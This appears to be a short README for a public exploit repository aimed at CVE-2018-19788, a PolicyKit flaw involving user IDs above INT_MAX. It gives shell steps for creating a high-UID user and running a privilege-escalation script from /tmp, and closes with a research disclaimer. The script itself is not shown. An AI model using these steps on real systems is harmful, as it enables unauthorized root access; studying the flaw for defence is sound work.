# CVE-2018-19788
Silly easy exploit for CVE-2018-19788

To use this, you must either create a user with UID > INT_MAX in Policy Kit or already have a low-priv user with said UID.

UID can be specified in user creation as follows, and used before execution of the script:

```bash
$ useradd -u 4000000001 PrivEsc
$ passwd PrivEsc
$ su PrivEsc
$ chmod +x /tmp/CVE-2018-19788_PrivEsc.sh
$ ./tmp/CVE-2018-19788_PrivEsc.sh
```

Please note this is merely for research and you are responsible for your own usage of any code found in this repository or any other, as common sense dictates.
